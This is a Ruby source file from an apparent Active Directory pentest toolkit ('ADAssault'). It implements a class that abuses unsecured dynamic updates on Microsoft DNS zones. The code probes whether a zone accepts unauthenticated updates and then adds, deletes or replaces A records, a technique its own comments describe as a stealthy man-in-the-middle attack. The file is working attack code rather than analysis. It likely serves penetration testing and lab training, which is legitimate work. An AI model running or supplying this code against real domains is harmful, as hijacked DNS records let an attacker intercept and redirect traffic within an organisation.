# frozen_string_literal: true

require 'ipaddr'
require 'random/formatter'

require 'dnsruby'
require 'paint'

module ADAssault
  module DNS
    # **DNS unsecure zone dynamic update (DUZDU).**
    #
    # On a misconfigured MS DNS zone, one can abuse dynamic updates to perform MiTM attacks in a very stealth way.
    #
    # On a Windows server with the DNS role, the `DSPROPERTY_ZONE_ALLOW_UPDATE` property defines whether dynamic updates are allowed. See [Microsoft - MS-DNSP - 2.3.2.1.1 Property Id](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/3af63871-0cc4-4179-916c-5caade55a8f3).
    # The possible values (`fAllowUpdate`) are (see [Microsoft - MS-DNSP - 2.2.5.2.4.1 DNS_RPC_ZONE_INFO_W2K](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/e8651544-0fbb-4038-8232-375ff2d8a55e)):
    #
    # - `0` (`ZONE_UPDATE_OFF`): No updates are allowed for the zone.
    # - `1` (`ZONE_UPDATE_UNSECURE`): All updates (secure and unsecure) are allowed for the zone.
    # - `2` (`ZONE_UPDATE_SECURE`): The zone only allows secure updates, that is, DNS packet MUST have a TSIG [RFC2845] present in the additional section.
    #
    # One can see the property when connected to the DNS server (near 100% of times on the domain controller), with the command: `dnscmd.exe /ZoneInfo <example: thm.local>` and the value of `update`.
    # Another option with the GUI, is to launch `DNS Manager` on the Windows server, then unfold the tree until the DNS zone, right click on it, select `Properties`, on the `General` tab, see the value of the select fields named `Dynamic updates`.
    # Of course it is also possible to check remotly by trying to create a record. (see {DUZDU#checkv4})
    #
    # References:
    #
    # - [[FR] ANSSI - Points de contrôle Active Directory - Zones DNS mal configurées (vuln_dnszone_bad_prop)](https://www.cert.ssi.gouv.fr/uploads/ad_checklist.html)
    # - [[FR] ANSSI - Bulletin d'alerte du CERT-FR - Multiples vulnérabilités dans Microsoft DNS server - CERTFR-2021-ALE-005](https://www.cert.ssi.gouv.fr/alerte/CERTFR-2021-ALE-005/)
    # - [[EN] RFC 2136 - Dynamic Updates in the Domain Name System (DNS UPDATE)](https://datatracker.ietf.org/doc/html/rfc2136)
    # - [[EN] RFC 2845 - Secret Key Transaction Authentication for DNS (TSIG)](https://datatracker.ietf.org/doc/html/rfc2845)
    # - [[EN] RFC 3007 - Secure Domain Name System (DNS) Dynamic Update](https://datatracker.ietf.org/doc/html/rfc3007)
    # - [[EN] RFC 4033 - DNS Security Introduction and Requirements](https://datatracker.ietf.org/doc/html/rfc4033)
    # - [[EN] RFC 4034 - Resource Records for the DNS Security Extensions](https://datatracker.ietf.org/doc/html/rfc4034)
    # - [[EN] RFC 4035 - Protocol Modifications for the DNS Security Extensions](https://datatracker.ietf.org/doc/html/rfc4035)
    # - [[EN] RFC 6895 - Domain Name System (DNS) IANA Considerations](https://datatracker.ietf.org/doc/html/rfc6895)
    # - [[EN] RFC 8945 - Secret Key Transaction Authentication for DNS (TSIG)](https://datatracker.ietf.org/doc/html/rfc8945)
    # @since 0.0.2
    class DUZDU
      # **Create the DUZDU object**
      # @param ad_domain [String] the Active Directory domain to work on.
      # @param dns_opts [Hash] options for the DNS resolver. See [Resolv::DNS.new](https://ruby-doc.org/3.3.0/stdlibs/resolv/Resolv/DNS.html#method-c-new).
      # @option dns_opts [Array|String] :nameserver the DNS server to contact
      # @example
      #   duz = ADAssault::DNS::DUZDU.new('THM.local', nameserver: ['10.10.30.209'])
      def initialize(ad_domain, dns_opts = nil)
        @ad_domain = ad_domain
        @dns_opts = dns_opts
      end

      # **Change the value of an existing DNS A record (IPv4) via dynamic updates**
      #
      # It will remove and recreate the record.
      #
      # **Warning**: if several entries exist for the same record, they will all be replaced by the new value.
      # @param name [String] DNS name, A record. The domain is automatically appended, e.g. `test` ➡️ `test.example.org`
      # @param ip [String] IP address
      # @return [TrueClass|FalseClass] `true` if the record was changed successfully
      # @example
      #   duz.replacev4('noraj', '10.10.56.126') # => true
      def replacev4(name, ip)
        deletev4(name)
        addv4(name, ip)
      end

      # **Add a DNS A record (IPv4) via dynamic updates**
      #
      # **Warning**: adding 2nd value the same name will result in two entries for the same record, not updating the name (for that use {replacev4}).
      # @param name [String] DNS name, A record. The domain is automatically appended, e.g. `test` ➡️ `test.example.org`
      # @param ip [String] IP address
      # @return [TrueClass|FalseClass] `true` if the record was added successfully
      # @example
      #   duz.addv4('noraj', '10.10.56.125') # => true
      def addv4(name, ip)
        update = Dnsruby::Update.new(@ad_domain)
        update.add("#{name}.#{@ad_domain}.", 'A', 300, ip)
        send_update(update)
      end

      # **Remove a DNS A record (IPv4) via dynamic updates**
      #
      # **Warning**: if several entries exist for the same record, they will all be deleted.
      # @param name [String] DNS name, A record. The domain is automatically appended, e.g. `test` ➡️ `test.example.org`
      # @return [TrueClass|FalseClass] `true` if the record was removed successfully
      # @example
      #   duz.deletev4('noraj') # => true
      def deletev4(name)
        update = Dnsruby::Update.new(@ad_domain)
        update.present("#{name}.#{@ad_domain}", 'A')
        update.delete("#{name}.#{@ad_domain}", 'A')
        send_update(update)
      end

      # rubocop:disable Metrics/AbcSize

      # **Check if unsecure dynamic updates are allowed (IPv4)**
      #
      # It will try to create a random IPv4 record in the zone and remove it.
      # @return [TrueClass|FalseClass] `true` means unsecure dynamic updates are enabled
      # @example
      #   duz.checkv4 # => false
      def checkv4
        networks = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'].map { |x| IPAddr.new(x) }
        network = networks.sample
        begin
          name = Random.uuid_v4 # Ruby 3.3+
        rescue NoMethodError
          # see https://github.com/ruby/securerandom/issues/31
          name = Random.uuid # Ruby 3.2-
        end
        ip = IPAddr.new(rand(network.to_range.begin.succ.to_i..(network.to_range.end.to_i - 1)), network.family)
        created = addv4(name, ip)
        # if created
        #   deletev4(name)
        #   true
        # else
        #   false
        # end
        created ? deletev4(name) || true : false
      end
      # rubocop:enable Metrics/AbcSize

      # **Get the value(s) of a DNS A record (IPv4)**
      # @param name [String] DNS name, A record. The domain is automatically appended, e.g. `test` ➡️ `test.example.org`
      # @return [Array<String>] the IP address(es) as string(s)
      # @example
      #   duz.getv4('noraj') # => ["10.10.56.128", "10.10.56.126"]
      def getv4(name)
        Dnsruby::DNS.open(@dns_opts) do |dns|
          ress = dns.getresources("#{name}.#{@ad_domain}", 'A')
          ress.map { |x| x.address.to_s }
        rescue Dnsruby::NXDomain # The requested domain does not exist
          ['']
        end
      end

      # Display a CLI-friendly output showing if the executed method was successful or not
      # @param success [TrueClass|FalseClass] result of the command
      # @param cmd [String] name of the executed command
      # @return [nil]
      def display(success, cmd)
        # allowed_methods = DUZDU.public_instance_methods(false) - [:display]
        # success = allowed_methods.include?(cmd.to_sym) ? send(cmd) : nil
        message = if success
                    Paint["✅ #{cmd} was executed successfully",
                          'green']
                  else
                    Paint["❌ #{cmd} was unsuccessful", 'red']
                  end
        puts message
      end

      # Display a CLI-friendly output formating the DNS record with its FQDN and IP addresses.
      # @param name [String] record name, e.g. the argument of {getv4}
      # @param ips [Array<String>] list of IP addresses, e.g. the return value of {getv4}
      # @return [nil]
      def display_record(name, ips)
        fqdn = "#{name}.#{@ad_domain}"
        puts "#{Paint[fqdn, 'cyan']} - #{Paint[ips.join(', '), 'aquamarine']}"
      end

      protected

      # **Send a DNS update request via dynamic updates**
      # @param update [Dnsruby::Update]
      # @return [TrueClass|FalseClass] `true` if the update succeeded
      # @example see {addv4} and {deletev4}
      def send_update(update)
        res = Dnsruby::Resolver.new(@dns_opts)
        begin
          res.send_message(update)
          true
        rescue Dnsruby::ResolvError, Dnsruby::ResolvTimeout => e
          puts "Update failed: #{e}"
          false
        end
      end
    end
  end
end
